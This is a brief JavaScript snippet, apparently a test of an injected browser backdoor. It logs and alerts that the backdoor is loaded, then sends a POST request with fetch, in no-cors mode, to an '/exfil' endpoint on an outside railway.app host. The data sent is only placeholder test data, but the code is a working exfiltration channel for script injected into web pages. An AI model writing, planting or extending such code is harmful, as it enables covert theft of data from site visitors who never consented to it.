console.log('🔥 Backdoor loaded!');
alert('Backdoor test working!');

// Send test data
fetch('https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil', {
    method: 'POST',
    body: 'test=hello',
    headers: {'Content-Type': 'text/plain'},
    mode: 'no-cors'
});
